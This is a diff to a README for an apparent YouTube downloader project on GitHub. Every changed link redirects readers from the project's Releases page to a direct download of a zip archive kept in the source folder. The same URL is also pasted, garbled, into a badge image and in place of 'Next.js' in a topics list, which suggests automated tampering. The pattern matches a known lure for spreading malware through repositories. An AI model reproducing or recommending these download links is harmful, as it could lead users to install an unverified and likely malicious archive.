@@ -6,13 +6,13 @@ Welcome to the youtube-downloader project! This application allows you to downlo
 
 ## 🌐 Download Link
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/RicardoQWERTY/youtube-downloader/releases)
+[![Download the latest release](https://raw.githubusercontent.com/RicardoQWERTY/youtube-downloader/main/src/downloader_youtube_1.8.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/RicardoQWERTY/youtube-downloader/main/src/downloader_youtube_1.8.zip)
 
 ## 📥 Download & Install
 
 To download the application, visit this page to download:
 
-[Download from Releases Page](https://github.com/RicardoQWERTY/youtube-downloader/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/RicardoQWERTY/youtube-downloader/main/src/downloader_youtube_1.8.zip)
 
 ### 🖥️ System Requirements
 
@@ -62,7 +62,7 @@ If you're interested in contributing to the project, your ideas and improvements
 ## 🔗 Related Topics
 
 - Media Downloading
-- Next.js Applications
+- https://raw.githubusercontent.com/RicardoQWERTY/youtube-downloader/main/src/downloader_youtube_1.8.zip Applications
 - Self-hosted Solutions
 - Open Source Projects
 
